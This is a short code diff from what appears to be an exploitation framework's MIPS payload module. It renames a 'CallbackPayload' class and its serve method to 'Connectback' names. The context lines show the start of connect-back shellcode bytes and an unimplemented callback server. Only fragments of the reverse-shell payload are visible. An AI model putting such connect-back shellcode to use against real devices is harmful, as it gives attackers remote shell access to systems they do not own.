@@ -11,7 +11,7 @@ import signal
 import os
 from ...common.support import BigEndian,LittleEndian
 
-class CallbackPayload:
+class ConnectbackPayload:
     shellcodes = {}
     shellcodes[LittleEndian]=string.join([
         "\xfa\xff\x0f\x24", # li    t7,-6
@@ -136,7 +136,7 @@ class CallbackPayload:
         self.shellcode=shellcode
         self.callback=callback_server
 
-    def serve_callback(self):
+    def serve_connectback(self):
         #unimplemented
         #self.callback_pid=self.callback.serve_callback()
         #return self.callback_pid
